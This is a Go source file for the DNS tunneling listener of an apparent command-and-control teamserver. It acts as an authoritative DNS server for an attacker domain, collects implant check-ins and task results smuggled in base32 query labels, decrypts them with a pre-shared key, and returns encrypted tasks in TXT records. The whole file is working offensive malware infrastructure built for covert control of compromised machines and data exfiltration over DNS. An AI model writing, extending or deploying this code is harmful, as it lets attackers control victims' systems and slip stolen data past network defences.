package listener

import (
	"encoding/base32"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"strings"
	"sync"
	"time"

	"github.com/darknexus/teamserver/internal/crypto"
	"github.com/darknexus/teamserver/internal/db"
	"github.com/darknexus/teamserver/internal/events"
	"github.com/darknexus/teamserver/internal/implant"
	"github.com/google/uuid"
)

/*
 * DNS Tunneling Listener
 *
 * Acts as an authoritative DNS server for the tunnel domain.
 * Protocol matches the implant's DNS channel (dns.c):
 *
 * Inbound queries (implant -> teamserver):
 *   Query name format: <type><seq>[f].<data_labels>.<session_id>.<domain>
 *   Type prefixes:
 *     'c' = check-in (beacon metadata)
 *     'd' = data upload (task results)
 *     'p' = poll (request pending tasks)
 *   Sequence: hex sequence number, 'f' suffix marks final chunk
 *   Data labels: base32-encoded encrypted payload, split across 63-char labels
 *   Session ID: 8-char hex identifier
 *
 * Outbound responses (teamserver -> implant):
 *   Data queries (c/d): A record ACK (1.2.3.4 = success, 1.2.3.5 = error)
 *   Poll queries (p): TXT record with base64-encoded encrypted task data
 *     Single-part: raw base64
 *     Multi-part: "M<n>:<base64_chunk>" in first TXT, then subsequent poll queries
 *     No data: TXT "NONE"
 *
 * Encryption: AES-256-GCM with pre-shared key (same as HTTPS channel)
 */

const (
	// DNS protocol constants
	dnsHeaderSize = 12
	dnsMaxUDP     = 512
	dnsMaxTXTData = 255 // max TXT string length per RFC 1035
	dnsMaxLabel   = 63

	// DNS record types
	dnsTypeA    = 1
	dnsTypeTXT  = 16

	// DNS response codes
	dnsRcodeOK     = 0
	dnsRcodeNXDomain = 3
	dnsRcodeRefused  = 5

	// ACK IP addresses (encoded in A record responses)
	ackSuccess = 0x04030201 // 1.2.3.4
	ackError   = 0x05030201 // 1.2.3.5

	// Query type prefixes (must match implant dns.h)
	prefixCheckin = 'c'
	prefixData    = 'd'
	prefixPoll    = 'p'
)

// dnsHeader represents a DNS packet header
type dnsHeader struct {
	ID      uint16
	Flags   uint16
	QDCount uint16
	ANCount uint16
	NSCount uint16
	ARCount uint16
}

// dnsQuestion represents a parsed DNS question
type dnsQuestion struct {
	Name  string
	QType uint16
	QClass uint16
}

// sessionChunks tracks incoming chunked data for a session
type sessionChunks struct {
	chunks   map[int]string // seq -> base32 data
	maxSeq   int
	complete bool
	created  time.Time
}

// sessionResponse holds a pending TXT response for an implant
type sessionResponse struct {
	data    []byte // raw encrypted bytes, ready for base64
	created time.Time
}

// DNSListener handles implant DNS tunnel communications
type DNSListener struct {
	ID       string
	Name     string
	BindAddr string
	Port     int
	Domain   string // authoritative domain (e.g., "t.evil.com")
	Registry *implant.Registry
	Database *db.Database
	PresharedKey []byte

	conn    *net.UDPConn
	running bool
	mu      sync.Mutex

	// per-session chunk reassembly (keyed by session_id + prefix)
	chunks   map[string]*sessionChunks
	chunksMu sync.Mutex

	// per-session pending responses (keyed by session_id)
	responses   map[string]*sessionResponse
	responsesMu sync.Mutex
}

func NewDNSListener(name, bindAddr string, port int, domain string, reg *implant.Registry, database *db.Database, psk []byte) *DNSListener {
	// normalize domain: strip trailing dot if present
	domain = strings.TrimSuffix(domain, ".")
	domain = strings.ToLower(domain)

	return &DNSListener{
		ID:           uuid.New().String(),
		Name:         name,
		BindAddr:     bindAddr,
		Port:         port,
		Domain:       domain,
		Registry:     reg,
		Database:     database,
		PresharedKey: psk,
		chunks:       make(map[string]*sessionChunks),
		responses:    make(map[string]*sessionResponse),
	}
}

// Start begins listening for DNS tunnel queries
func (l *DNSListener) Start() error {
	l.mu.Lock()
	defer l.mu.Unlock()

	if l.running {
		return fmt.Errorf("listener already running")
	}

	addr := fmt.Sprintf("%s:%d", l.BindAddr, l.Port)
	udpAddr, err := net.ResolveUDPAddr("udp", addr)
	if err != nil {
		return fmt.Errorf("resolve addr: %w", err)
	}

	l.conn, err = net.ListenUDP("udp", udpAddr)
	if err != nil {
		return fmt.Errorf("listen on %s: %w", addr, err)
	}

	l.running = true

	l.Database.SaveListener(&db.Listener{
		ID: l.ID, Name: l.Name, Type: "dns",
		BindAddr: l.BindAddr, Port: l.Port,
		Status: "running", Profile: l.Domain,
	})

	log.Printf("[listener] DNS listener '%s' started on %s (domain: %s)", l.Name, addr, l.Domain)
	events.Emit(events.EventListenerStarted, map[string]interface{}{
		"id": l.ID, "name": l.Name, "type": "dns", "addr": addr, "domain": l.Domain,
	})

	// start packet handler
	go l.serve()

	// start stale session cleanup
	go l.cleanupLoop()

	return nil
}

// Stop shuts down the DNS listener
func (l *DNSListener) Stop() error {
	l.mu.Lock()
	defer l.mu.Unlock()

	if !l.running {
		return fmt.Errorf("listener not running")
	}

	l.conn.Close()
	l.running = false

	l.Database.SaveListener(&db.Listener{
		ID: l.ID, Name: l.Name, Type: "dns",
		BindAddr: l.BindAddr, Port: l.Port,
		Status: "stopped", Profile: l.Domain,
	})

	log.Printf("[listener] DNS listener '%s' stopped", l.Name)
	events.Emit(events.EventListenerStopped, map[string]interface{}{"id": l.ID, "name": l.Name})
	return nil
}

// ============================================================
// Packet Handler
// ============================================================

func (l *DNSListener) serve() {
	buf := make([]byte, 4096)

	for {
		l.mu.Lock()
		running := l.running
		l.mu.Unlock()
		if !running {
			return
		}

		l.conn.SetReadDeadline(time.Now().Add(1 * time.Second))
		n, remoteAddr, err := l.conn.ReadFromUDP(buf)
		if err != nil {
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				continue
			}
			if !l.running {
				return
			}
			log.Printf("[dns] read error: %v", err)
			continue
		}

		// copy packet data so we can process async
		pkt := make([]byte, n)
		copy(pkt, buf[:n])

		go l.handlePacket(pkt, remoteAddr)
	}
}

func (l *DNSListener) handlePacket(pkt []byte, addr *net.UDPAddr) {
	if len(pkt) < dnsHeaderSize {
		return
	}

	// parse header
	hdr := parseDNSHeader(pkt)

	// must be a standard query (QR=0, Opcode=0)
	if hdr.Flags&0x8000 != 0 { // QR bit set = response, ignore
		return
	}
	if hdr.QDCount == 0 {
		return
	}

	// parse question
	q, offset := parseDNSQuestion(pkt, dnsHeaderSize)
	if q == nil {
		return
	}

	// check if query is for our domain
	qname := strings.ToLower(q.Name)
	if !strings.HasSuffix(qname, "."+l.Domain) && qname != l.Domain {
		// not our domain, respond with REFUSED
		l.sendErrorResponse(pkt, hdr.ID, dnsRcodeRefused, q, addr)
		return
	}

	// extract tunnel labels (everything before the domain suffix)
	prefix := strings.TrimSuffix(qname, "."+l.Domain)
	labels := strings.Split(prefix, ".")

	if len(labels) < 2 {
		// malformed tunnel query
		l.sendErrorResponse(pkt, hdr.ID, dnsRcodeNXDomain, q, addr)
		return
	}

	// parse: first label = <type><seq>[f], last label before domain = session_id
	controlLabel := labels[0]
	sessionID := labels[len(labels)-1]

	// validate session ID (8 hex chars)
	if len(sessionID) != 8 {
		l.sendErrorResponse(pkt, hdr.ID, dnsRcodeNXDomain, q, addr)
		return
	}

	// parse control label
	if len(controlLabel) < 2 {
		l.sendErrorResponse(pkt, hdr.ID, dnsRcodeNXDomain, q, addr)
		return
	}

	queryType := controlLabel[0]
	seqStr := controlLabel[1:]
	isFinal := false

	if len(seqStr) > 0 && seqStr[len(seqStr)-1] == 'f' {
		isFinal = true
		seqStr = seqStr[:len(seqStr)-1]
	}

	seq := 0
	fmt.Sscanf(seqStr, "%x", &seq)

	// extract data labels (everything between control label and session ID)
	dataLabels := labels[1 : len(labels)-1]
	chunkData := strings.Join(dataLabels, "")

	switch queryType {
	case prefixCheckin, prefixData:
		l.handleDataQuery(hdr.ID, queryType, sessionID, seq, isFinal, chunkData, q, addr)
	case prefixPoll:
		l.handlePollQuery(hdr.ID, sessionID, seq, q, addr)
	default:
		l.sendErrorResponse(pkt, hdr.ID, dnsRcodeNXDomain, q, addr)
	}
}

// ============================================================
// Data Query Handler (checkin / results upload)
// ============================================================

func (l *DNSListener) handleDataQuery(txid uint16, queryType byte, sessionID string, seq int, isFinal bool, chunkData string, q *dnsQuestion, addr *net.UDPAddr) {
	chunkKey := fmt.Sprintf("%s:%c", sessionID, queryType)

	l.chunksMu.Lock()

	chunks, exists := l.chunks[chunkKey]
	if !exists {
		chunks = &sessionChunks{
			chunks:  make(map[int]string),
			created: time.Now(),
		}
		l.chunks[chunkKey] = chunks
	}

	chunks.chunks[seq] = chunkData
	if seq > chunks.maxSeq {
		chunks.maxSeq = seq
	}

	if isFinal {
		chunks.complete = true
	}

	// check if all chunks received
	if !chunks.complete {
		l.chunksMu.Unlock()
		l.sendARecord(txid, ackSuccess, q, addr)
		return
	}

	// verify we have all chunks 0..maxSeq
	for i := 0; i <= chunks.maxSeq; i++ {
		if _, ok := chunks.chunks[i]; !ok {
			l.chunksMu.Unlock()
			l.sendARecord(txid, ackSuccess, q, addr)
			return
		}
	}

	// reassemble in order
	var fullData strings.Builder
	for i := 0; i <= chunks.maxSeq; i++ {
		fullData.WriteString(chunks.chunks[i])
	}

	// clean up chunks
	delete(l.chunks, chunkKey)
	l.chunksMu.Unlock()

	// base32 decode
	b32data := strings.ToUpper(fullData.String()) // Go's base32 expects uppercase
	decoded, err := base32Decode(b32data)
	if err != nil {
		log.Printf("[dns] base32 decode error for session %s: %v", sessionID, err)
		l.sendARecord(txid, ackError, q, addr)
		return
	}

	// decrypt
	plaintext, err := crypto.Decrypt(l.PresharedKey, decoded)
	if err != nil {
		log.Printf("[dns] decrypt error for session %s: %v", sessionID, err)
		l.sendARecord(txid, ackError, q, addr)
		return
	}

	// process based on query type
	switch queryType {
	case prefixCheckin:
		l.processCheckin(sessionID, plaintext, addr)
	case prefixData:
		l.processResults(sessionID, plaintext)
	}

	l.sendARecord(txid, ackSuccess, q, addr)
}

func (l *DNSListener) processCheckin(sessionID string, jsonData []byte, addr *net.UDPAddr) {
	var checkin implant.CheckinRequest
	if err := json.Unmarshal(jsonData, &checkin); err != nil {
		log.Printf("[dns] checkin JSON parse error: %v", err)
		return
	}

	externalIP := addr.IP.String()

	resp, err := l.Registry.HandleCheckin(&checkin, externalIP)
	if err != nil {
		log.Printf("[dns] checkin error: %v", err)
		return
	}

	// serialize response
	respJSON, err := json.Marshal(resp)
	if err != nil {
		log.Printf("[dns] response marshal error: %v", err)
		return
	}

	// encrypt response
	encrypted, err := crypto.Encrypt(l.PresharedKey, respJSON)
	if err != nil {
		log.Printf("[dns] encrypt error: %v", err)
		return
	}

	// store for poll query
	l.responsesMu.Lock()
	l.responses[sessionID] = &sessionResponse{
		data:    encrypted,
		created: time.Now(),
	}
	l.responsesMu.Unlock()
}

func (l *DNSListener) processResults(sessionID string, jsonData []byte) {
	var results []implant.TaskResult
	if err := json.Unmarshal(jsonData, &results); err != nil {
		log.Printf("[dns] results JSON parse error: %v", err)
		return
	}

	if err := l.Registry.HandleTaskResult(results); err != nil {
		log.Printf("[dns] task result error: %v", err)
	}
}

// ============================================================
// Poll Query Handler (implant requesting tasks)
// ============================================================

func (l *DNSListener) handlePollQuery(txid uint16, sessionID string, seq int, q *dnsQuestion, addr *net.UDPAddr) {
	l.responsesMu.Lock()
	resp, exists := l.responses[sessionID]
	l.responsesMu.Unlock()

	if !exists || resp == nil {
		// no pending response
		l.sendTXTRecord(txid, "NONE", q, addr)
		return
	}

	// base64 encode the encrypted data
	b64data := base64.StdEncoding.EncodeToString(resp.data)

	// check if it fits in a single TXT response
	// TXT record max string is 255, but we can have multiple strings in one record
	// keep it simple: if it fits in ~250 chars of base64, single response
	if len(b64data) <= 250 && seq == 0 {
		// single-part response, clean up
		l.responsesMu.Lock()
		delete(l.responses, sessionID)
		l.responsesMu.Unlock()

		l.sendTXTRecord(txid, b64data, q, addr)
		return
	}

	// multi-part response
	chunkSize := 240 // leave room for M<n>: prefix
	totalChunks := (len(b64data) + chunkSize - 1) / chunkSize

	if seq == 0 {
		// first chunk: prefix with total count
		end := chunkSize
		if end > len(b64data) {
			end = len(b64data)
		}
		txtData := fmt.Sprintf("M%d:%s", totalChunks, b64data[:end])
		l.sendTXTRecord(txid, txtData, q, addr)
	} else if seq < totalChunks {
		// subsequent chunk
		start := seq * chunkSize
		end := start + chunkSize
		if end > len(b64data) {
			end = len(b64data)
		}
		l.sendTXTRecord(txid, b64data[start:end], q, addr)

		// if this was the last chunk, clean up
		if seq == totalChunks-1 {
			l.responsesMu.Lock()
			delete(l.responses, sessionID)
			l.responsesMu.Unlock()
		}
	} else {
		// seq out of range, clean up
		l.responsesMu.Lock()
		delete(l.responses, sessionID)
		l.responsesMu.Unlock()
		l.sendTXTRecord(txid, "NONE", q, addr)
	}
}

// ============================================================
// DNS Response Builders
// ============================================================

func (l *DNSListener) sendARecord(txid uint16, ip uint32, q *dnsQuestion, addr *net.UDPAddr) {
	resp := buildDNSResponse(txid, q, dnsTypeA, ip, nil)
	l.conn.WriteToUDP(resp, addr)
}

func (l *DNSListener) sendTXTRecord(txid uint16, text string, q *dnsQuestion, addr *net.UDPAddr) {
	resp := buildDNSResponse(txid, q, dnsTypeTXT, 0, []byte(text))
	l.conn.WriteToUDP(resp, addr)
}

func (l *DNSListener) sendErrorResponse(rawQuery []byte, txid uint16, rcode uint16, q *dnsQuestion, addr *net.UDPAddr) {
	// build minimal error response
	resp := make([]byte, 0, dnsHeaderSize+256)

	// header
	hdr := make([]byte, dnsHeaderSize)
	binary.BigEndian.PutUint16(hdr[0:], txid)
	binary.BigEndian.PutUint16(hdr[2:], 0x8000|rcode) // QR=1 + rcode
	binary.BigEndian.PutUint16(hdr[4:], 1)             // QD=1
	binary.BigEndian.PutUint16(hdr[6:], 0)             // AN=0
	binary.BigEndian.PutUint16(hdr[8:], 0)             // NS=0
	binary.BigEndian.PutUint16(hdr[10:], 0)            // AR=0
	resp = append(resp, hdr...)

	// echo question section
	if q != nil {
		resp = append(resp, encodeDNSName(q.Name)...)
		qbuf := make([]byte, 4)
		binary.BigEndian.PutUint16(qbuf[0:], q.QType)
		binary.BigEndian.PutUint16(qbuf[2:], q.QClass)
		resp = append(resp, qbuf...)
	}

	l.conn.WriteToUDP(resp, addr)
}

// buildDNSResponse constructs a complete DNS response packet
func buildDNSResponse(txid uint16, q *dnsQuestion, rrType uint16, aIP uint32, txtData []byte) []byte {
	resp := make([]byte, 0, dnsMaxUDP)

	// header
	hdr := make([]byte, dnsHeaderSize)
	binary.BigEndian.PutUint16(hdr[0:], txid)
	binary.BigEndian.PutUint16(hdr[2:], 0x8580) // QR=1, AA=1, RD=1, RA=1
	binary.BigEndian.PutUint16(hdr[4:], 1)       // QD=1
	binary.BigEndian.PutUint16(hdr[6:], 1)       // AN=1
	binary.BigEndian.PutUint16(hdr[8:], 0)       // NS=0
	binary.BigEndian.PutUint16(hdr[10:], 0)      // AR=0
	resp = append(resp, hdr...)

	// question section (echo back)
	qname := encodeDNSName(q.Name)
	resp = append(resp, qname...)
	qbuf := make([]byte, 4)
	binary.BigEndian.PutUint16(qbuf[0:], q.QType)
	binary.BigEndian.PutUint16(qbuf[2:], q.QClass)
	resp = append(resp, qbuf...)

	// answer section
	// use compression pointer to QNAME (offset 12 = right after header)
	resp = append(resp, 0xC0, 0x0C) // compression pointer to offset 12

	anbuf := make([]byte, 8)
	binary.BigEndian.PutUint16(anbuf[0:], rrType)
	binary.BigEndian.PutUint16(anbuf[2:], 1) // class IN
	binary.BigEndian.PutUint32(anbuf[4:], 0) // TTL = 0 (no caching)
	resp = append(resp, anbuf...)

	switch rrType {
	case dnsTypeA:
		rdlen := make([]byte, 2)
		binary.BigEndian.PutUint16(rdlen, 4)
		resp = append(resp, rdlen...)
		// IP in network byte order (already little-endian packed by implant convention)
		ipBytes := make([]byte, 4)
		binary.LittleEndian.PutUint32(ipBytes, aIP)
		resp = append(resp, ipBytes...)

	case dnsTypeTXT:
		// TXT RDATA: one or more <length><string> segments
		// split into 255-byte chunks per RFC 1035
		rdata := encodeTXTRData(txtData)
		rdlen := make([]byte, 2)
		binary.BigEndian.PutUint16(rdlen, uint16(len(rdata)))
		resp = append(resp, rdlen...)
		resp = append(resp, rdata...)
	}

	return resp
}

// encodeTXTRData splits text into 255-byte TXT strings
func encodeTXTRData(data []byte) []byte {
	var rdata []byte
	remaining := data
	for len(remaining) > 0 {
		chunkLen := len(remaining)
		if chunkLen > dnsMaxTXTData {
			chunkLen = dnsMaxTXTData
		}
		rdata = append(rdata, byte(chunkLen))
		rdata = append(rdata, remaining[:chunkLen]...)
		remaining = remaining[chunkLen:]
	}
	// if empty, still need one zero-length string
	if len(data) == 0 {
		rdata = append(rdata, 0)
	}
	return rdata
}

// ============================================================
// DNS Packet Parsing
// ============================================================

func parseDNSHeader(pkt []byte) dnsHeader {
	return dnsHeader{
		ID:      binary.BigEndian.Uint16(pkt[0:]),
		Flags:   binary.BigEndian.Uint16(pkt[2:]),
		QDCount: binary.BigEndian.Uint16(pkt[4:]),
		ANCount: binary.BigEndian.Uint16(pkt[6:]),
		NSCount: binary.BigEndian.Uint16(pkt[8:]),
		ARCount: binary.BigEndian.Uint16(pkt[10:]),
	}
}

func parseDNSQuestion(pkt []byte, offset int) (*dnsQuestion, int) {
	name, newOffset := decodeDNSName(pkt, offset)
	if name == "" || newOffset+4 > len(pkt) {
		return nil, offset
	}

	q := &dnsQuestion{
		Name:   name,
		QType:  binary.BigEndian.Uint16(pkt[newOffset:]),
		QClass: binary.BigEndian.Uint16(pkt[newOffset+2:]),
	}

	return q, newOffset + 4
}

// decodeDNSName reads a DNS name from wire format, handling compression pointers
func decodeDNSName(pkt []byte, offset int) (string, int) {
	var labels []string
	pos := offset
	jumped := false
	returnPos := 0
	maxJumps := 10 // prevent infinite loops

	for i := 0; i < maxJumps; i++ {
		if pos >= len(pkt) {
			return "", offset
		}

		labelLen := int(pkt[pos])

		if labelLen == 0 {
			if !jumped {
				returnPos = pos + 1
			}
			break
		}

		// compression pointer
		if labelLen&0xC0 == 0xC0 {
			if pos+1 >= len(pkt) {
				return "", offset
			}
			ptr := int(binary.BigEndian.Uint16(pkt[pos:]) & 0x3FFF)
			if !jumped {
				returnPos = pos + 2
			}
			jumped = true
			pos = ptr
			continue
		}

		pos++
		if pos+labelLen > len(pkt) {
			return "", offset
		}

		labels = append(labels, string(pkt[pos:pos+labelLen]))
		pos += labelLen
	}

	if !jumped {
		returnPos = pos
	}

	return strings.Join(labels, "."), returnPos
}

// encodeDNSName converts a domain name to wire format
func encodeDNSName(name string) []byte {
	var buf []byte
	labels := strings.Split(name, ".")
	for _, label := range labels {
		if len(label) == 0 {
			continue
		}
		buf = append(buf, byte(len(label)))
		buf = append(buf, []byte(label)...)
	}
	buf = append(buf, 0) // root label
	return buf
}

// ============================================================
// Base32 Decode (matches implant encoder: RFC 4648 lowercase, no padding)
// ============================================================

func base32Decode(data string) ([]byte, error) {
	// the implant uses lowercase RFC 4648 base32 without padding
	// Go's base32 wants uppercase, so we uppercased before calling
	// pad to multiple of 8 for Go's decoder
	padLen := (8 - len(data)%8) % 8
	padded := data + strings.Repeat("=", padLen)

	return base32.StdEncoding.DecodeString(padded)
}

// ============================================================
// Stale Session Cleanup
// ============================================================

func (l *DNSListener) cleanupLoop() {
	ticker := time.NewTicker(60 * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		l.mu.Lock()
		running := l.running
		l.mu.Unlock()
		if !running {
			return
		}

		now := time.Now()
		staleThreshold := 5 * time.Minute

		// clean stale chunks
		l.chunksMu.Lock()
		for key, chunks := range l.chunks {
			if now.Sub(chunks.created) > staleThreshold {
				delete(l.chunks, key)
			}
		}
		l.chunksMu.Unlock()

		// clean stale responses
		l.responsesMu.Lock()
		for key, resp := range l.responses {
			if now.Sub(resp.created) > staleThreshold {
				delete(l.responses, key)
			}
		}
		l.responsesMu.Unlock()
	}
}
